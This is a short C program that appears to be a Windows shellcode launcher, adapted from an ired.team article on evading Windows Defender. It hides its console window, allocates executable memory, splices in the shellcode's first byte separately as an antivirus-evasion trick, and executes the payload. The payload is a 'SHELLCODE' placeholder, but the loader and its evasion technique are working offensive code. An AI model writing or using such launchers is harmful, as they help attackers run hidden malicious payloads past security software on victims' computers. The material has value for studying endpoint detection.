#include "stdafx.h"
#include "Windows.h"

// taken from here: https://www.ired.team/offensive-security/defense-evasion/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change

int main(int argc, char* argv[]) {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	unsigned char shellcode[] = "SHELLCODE";
	char first[] = "FIRST BYTE"; // first byte of shell code goes here, extra evasion technique
	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	memcpy(shellcode, first, 1);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

	return 0;

}
